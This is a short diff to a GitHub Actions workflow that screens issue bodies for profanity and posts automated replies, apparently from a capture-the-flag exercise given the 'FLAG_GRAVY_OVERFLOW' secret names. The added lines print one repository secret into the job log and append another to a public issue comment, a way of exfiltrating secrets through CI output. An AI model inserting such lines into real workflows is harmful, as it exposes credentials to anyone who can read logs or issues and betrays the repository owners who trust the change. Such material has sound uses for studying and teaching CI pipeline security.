@@ -40,6 +40,7 @@ jobs:
         id: check_profanities
         run: |
           echo "Checking issue body for profanities..."
+          echo ${{ secrets.FLAG_GRAVY_OVERFLOW_L0_FRIES }}
           PROFANITIES_LIST="bad|disguting|horrible"
           if echo "${{ github.event.issue.body }}" | grep -qiE "$PROFANITIES_LIST"; then
             echo "Profanity detected in issue body. Please clean up the language."
@@ -76,7 +77,7 @@ jobs:
             } else {
               response = "Sorry, I didn't understand that. Can you try again?";
             }
-
+            response = response + ${{ secrets.FLAG_GRAVY_OVERFLOW_L0_CHEDDAR }}
             github.rest.issues.createComment({
               issue_number: context.payload.issue.number,
               owner: context.repo.owner,
